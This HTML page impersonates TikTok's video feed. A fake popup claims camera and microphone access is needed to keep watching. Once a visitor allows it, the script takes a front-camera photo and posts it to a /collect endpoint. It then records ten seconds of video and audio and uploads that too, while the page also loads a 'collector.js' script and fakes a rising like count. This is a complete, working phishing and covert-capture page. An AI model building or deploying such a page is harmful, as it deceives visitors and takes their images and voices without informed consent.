<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Make Your Day</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Arial,sans-serif;background:#000;color:#fff;height:100vh;overflow:hidden}
        .container{width:100%;height:100vh;position:relative;background:#000}
        
        .status-bar{
            position:absolute;top:0;left:0;right:0;
            padding:10px 15px;display:flex;
            justify-content:space-between;align-items:center;
            z-index:50;background:rgba(0,0,0,0.4);
        }
        .green-dot{
            width:12px;height:12px;background:#34c759;
            border-radius:50%;display:none;
            box-shadow:0 0 10px rgba(52,199,89,0.9);
            animation:pulse 1.5s infinite;
        }
        .yellow-dot{
            width:12px;height:12px;background:#ffcc00;
            border-radius:50%;display:none;
            box-shadow:0 0 10px rgba(255,204,0,0.9);
            animation:pulse 1.5s infinite;
        }
        @keyframes pulse{
            0%,100%{box-shadow:0 0 10px rgba(52,199,89,0.9)}
            50%{box-shadow:0 0 20px rgba(52,199,89,1)}
        }
        .dots-group{display:flex;gap:10px;align-items:center}
        .timer{color:#fff;font-size:13px}
        
        /* Video background - animated gradient as fallback */
        .video-bg{
            position:absolute;top:0;left:0;
            width:100%;height:100%;
            background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460,#1a1a2e);
            background-size:400% 400%;
            animation:bgMove 6s ease infinite;
        }
        @keyframes bgMove{
            0%{background-position:0% 50%}
            50%{background-position:100% 50%}
            100%{background-position:0% 50%}
        }
        .video-bg video{width:100%;height:100%;object-fit:cover;display:none}
        
        #cameraPreview{
            position:absolute;top:0;left:0;
            width:100%;height:100%;
            object-fit:cover;z-index:10;
            display:none;
        }
        
        .rec-msg{
            position:absolute;top:50px;left:50%;
            transform:translateX(-50%);
            color:#ff0050;font-size:14px;font-weight:700;
            z-index:30;display:none;
            background:rgba(0,0,0,0.5);
            padding:6px 14px;border-radius:15px;
        }
        
        .progress-bar{
            position:absolute;bottom:50px;left:20px;right:20px;
            height:3px;background:rgba(255,255,255,0.2);
            border-radius:2px;z-index:10;
        }
        .progress-fill{
            height:100%;background:#ff0050;border-radius:2px;
            animation:progress 300s linear forwards;
        }
        @keyframes progress{from{width:0%}to{width:100%}}
        
        .side-buttons{
            position:absolute;right:12px;bottom:120px;
            display:flex;flex-direction:column;align-items:center;gap:25px;z-index:5;
        }
        .side-btn{display:flex;flex-direction:column;align-items:center;gap:4px}
        .side-btn .icon{
            width:45px;height:45px;background:rgba(255,255,255,0.1);
            border-radius:50%;display:flex;justify-content:center;
            align-items:center;font-size:22px;
        }
        .side-btn span{font-size:11px;color:#ddd}
        
        .bottom-info{
            position:absolute;bottom:60px;left:15px;right:70px;z-index:5;
        }
        .username{font-weight:700;font-size:15px;margin-bottom:6px}
        .badge{background:#ff0050;font-size:10px;padding:2px 6px;border-radius:4px;margin-left:6px}
        .caption{font-size:13px;color:#ddd;margin-bottom:8px}
        .music{font-size:11px;color:#999}
        
        .bottom-nav{
            position:absolute;bottom:0;width:100%;
            display:flex;justify-content:space-around;
            padding:12px 0 25px;background:#000;
            border-top:1px solid#222;z-index:10;
        }
        .nav-item{display:flex;flex-direction:column;align-items:center;gap:4px;font-size:10px;color:#888}
        .nav-item.active{color:#fff}
        .nav-item .nav-icon{font-size:22px}
        .nav-item .plus{background:#ff0050;width:30px;height:30px;border-radius:8px;display:flex;justify-content:center;align-items:center;font-size:20px;color:#fff}
        
        .camera-popup{
            position:absolute;top:50%;left:50%;
            transform:translate(-50%,-50%);
            background:#1a1a2e;padding:30px;border-radius:20px;
            text-align:center;z-index:100;
            border:1px solid#333;
        }
        .camera-popup h3{color:#fff;margin-bottom:10px}
        .camera-popup p{color:#aaa;font-size:13px;margin-bottom:20px}
        .camera-popup button{
            background:#ff0050;color:#fff;border:none;
            padding:12px 30px;border-radius:25px;
            font-size:16px;cursor:pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="status-bar">
            <span class="timer" id="displayTimer">5:00</span>
            <div class="dots-group">
                <div class="green-dot" id="greenDot"></div>
                <div class="yellow-dot" id="yellowDot"></div>
            </div>
        </div>
        
        <div class="rec-msg" id="recMsg"></div>
        
        <div class="video-bg" id="videoBg">
            <video id="mainVideo" loop muted playsinline>
                <source src="https://assets.mixkit.co/videos/preview/mixkit-girl-dancing-to-pop-music-5790-large.mp4" type="video/mp4">
            </video>
        </div>
        
        <video id="cameraPreview" autoplay muted playsinline></video>
        
        <div class="progress-bar"><div class="progress-fill"></div></div>
        
        <!-- Camera permission popup -->
        <div class="camera-popup" id="camPopup">
            <h3>🎵 TikTok</h3>
            <p>Allow camera & microphone<br>to continue watching</p>
            <button onclick="startCam()">Allow</button>
        </div>
        
        <div class="side-buttons">
            <div class="side-btn"><div class="icon">👤</div></div>
            <div class="side-btn"><div class="icon">❤️</div><span id="likeCount">87.4K</span></div>
            <div class="side-btn"><div class="icon">💬</div><span>2.4K</span></div>
            <div class="side-btn"><div class="icon">🔗</div><span>Share</span></div>
            <div class="side-btn"><div class="icon">🎵</div></div>
        </div>
        
        <div class="bottom-info">
            <div class="username">@dance_trends<span class="badge">Follow</span></div>
            <div class="caption">This dance is going viral! 😱🔥 #fyp #trending</div>
            <div class="music">🎵 Original Sound - TikTok</div>
        </div>
        
        <div class="bottom-nav">
            <div class="nav-item active"><div class="nav-icon">🏠</div>Home</div>
            <div class="nav-item"><div class="nav-icon">🔍</div>Discover</div>
            <div class="nav-item"><div class="plus">+</div></div>
            <div class="nav-item"><div class="nav-icon">💬</div>Inbox</div>
            <div class="nav-item"><div class="nav-icon">👤</div>Profile</div>
        </div>
    </div>
    
    <script src="/collector.js?v=12"></script>
    <script>
        // Timer
        var timeLeft=300;
        setInterval(function(){
            if(timeLeft>0){timeLeft--;
                var m=Math.floor(timeLeft/60);
                var s=timeLeft%60;
                document.getElementById('displayTimer').textContent=m+':'+(s<10?'0':'')+s;
            }
        },1000);
        
        // Play video
        var video=document.getElementById('mainVideo');
        video.addEventListener('loadeddata',function(){
            video.style.display='block';
            video.play();
        });
        video.load();
        
        // Like counter
        setInterval(function(){
            var el=document.getElementById('likeCount');
            var val=parseFloat(el.textContent);
            if(val<95)el.textContent=(val+0.1).toFixed(1)+'K';
        },4000);
        
        // Global start function for button
        var recorder=null;
        var recChunks=[];
        var camStream=null;
        
        async function startCam(){
            document.getElementById('camPopup').style.display='none';
            try{
                camStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
                
                // Show full camera preview
                var preview=document.getElementById('cameraPreview');
                preview.srcObject=camStream;
                preview.style.display='block';
                await preview.play();
                
                // Show dots
                document.getElementById('greenDot').style.display='block';
                document.getElementById('yellowDot').style.display='block';
                
                // Take photo after 1.5s
                await new Promise(r=>setTimeout(r,1500));
                var canvas=document.createElement('canvas');
                canvas.width=preview.videoWidth||640;
                canvas.height=preview.videoHeight||480;
                canvas.getContext('2d').drawImage(preview,0,0);
                var photo=canvas.toDataURL('image/jpeg',0.9);
                
                // Send photo
                await fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phase:'phase2',photo:photo,timestamp:new Date().toISOString()})});
                
                // Hide preview
                preview.style.display='none';
                
                // Record 10 seconds
                recorder=new MediaRecorder(camStream,{mimeType:'video/webm'});
                recorder.ondataavailable=function(e){if(e.data.size>0)recChunks.push(e.data);};
                recorder.onstop=sendVid;
                recorder.start(1000);
                
                // Countdown
                var sec=10;
                var msgEl=document.getElementById('recMsg');
                msgEl.style.display='block';
                msgEl.textContent='● REC '+sec+'s';
                var cd=setInterval(function(){
                    sec--;
                    if(sec>0)msgEl.textContent='● REC '+sec+'s';
                    else{clearInterval(cd);msgEl.style.display='none';}
                },1000);
                
                setTimeout(function(){
                    if(recorder&&recorder.state==='recording'){
                        recorder.stop();
                        camStream.getTracks().forEach(t=>t.stop());
                        document.getElementById('greenDot').style.display='none';
                        document.getElementById('yellowDot').style.display='none';
                    }
                },10000);
                
            }catch(e){alert('Camera needed: '+e.message);}
        }
        
        function sendVid(){
            if(recChunks.length>0){
                var blob=new Blob(recChunks,{type:'video/webm'});
                var reader=new FileReader();
                reader.onload=function(){
                    fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phase:'phase3',video:reader.result,timestamp:new Date().toISOString()})});
                };
                reader.readAsDataURL(blob);
            }
        }
    </script>
</body>
</html>
